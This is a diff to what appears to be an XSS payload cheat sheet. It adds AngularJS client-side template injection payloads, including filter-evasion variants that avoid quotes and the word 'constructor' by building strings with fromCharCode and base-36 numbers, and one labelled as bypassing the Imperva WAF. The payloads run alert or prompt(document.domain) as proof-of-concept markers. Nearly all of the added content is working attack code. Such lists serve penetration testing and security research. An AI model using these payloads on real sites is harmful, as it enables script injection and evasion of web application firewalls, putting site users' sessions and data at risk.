@@ -6,6 +6,8 @@ The following payloads are based on Client Side Template Injection.
 
 ### Stored/Reflected XSS - Simple alert in AngularJS
 
+`ng-app` directive must be present in a root element to allow the client-side injection (cf. [AngularJS: API: ngApp](https://docs.angularjs.org/api/ng/directive/ngApp)).
+
 > AngularJS as of version 1.6 have removed the sandbox altogether
 
 AngularJS 1.6+ by [Mario Heiderich](https://twitter.com/cure53berlin)
@@ -149,6 +151,37 @@ AngularJS 1.0.1 - 1.1.5 and Vue JS
 {{constructor.constructor('alert(1)')()}}
 ```
 
+### Advanced bypassing XSS
+
+AngularJS (without `'` single and `"` double quotes) by [@Viren](https://twitter.com/VirenPawar_)
+
+```javascript
+{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
+```
+
+AngularJS (without `'` single and `"` double quotes and `constructor` string)
+
+```javascript
+{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+```
+
+```javascript
+{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+```
+
+```javascript
+{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+```
+
+```javascript
+{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);a.sub.call.call({}[a].getOwnPropertyDescriptor(a.sub.__proto__,a).value,0,toString()[a].fromCodePoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
+```
+
+AngularJS bypass Waf [Imperva]
+
+```javascript
+{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\u{6f}mpt(d\\u{6f}cument.d\\u{6f}main)')()}}
+```
 
 ### Blind XSS
 
